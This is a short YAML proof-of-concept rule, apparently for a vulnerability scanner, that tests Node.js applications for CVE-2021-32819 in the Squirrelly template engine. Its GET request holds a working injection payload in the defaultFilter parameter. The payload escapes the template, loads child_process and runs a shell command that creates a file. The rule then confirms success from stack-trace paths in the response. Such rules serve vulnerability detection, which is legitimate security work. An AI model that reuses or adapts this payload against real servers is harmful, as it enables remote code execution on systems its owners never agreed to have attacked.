name: poc-yaml-Nodejs-squirrelly-CVE-2021-32819
rules:
  - method: GET
    path: /?Express=aaaa&autoEscape=&defaultFilter=e%27);var+require=global.require+%7C%7C+global.process.mainModule.constructor._load;+require(%27child_process%27).exec(%27touch+/app/1111%27);
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101Firefox/91.0 Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    follow_redirects: true
    expression: response.status == 500 && response.body.bcontains(b"/app/node_modules/squirrelly/dist/squirrelly.cjs.js") && response.body.bcontains(b"/app/node_modules/express/lib/application.js")
detail:
  author: MARLO(https://github.com/Huangmarlo)
  links:
    - https://www.linuxlz.com/aqld/2331.html
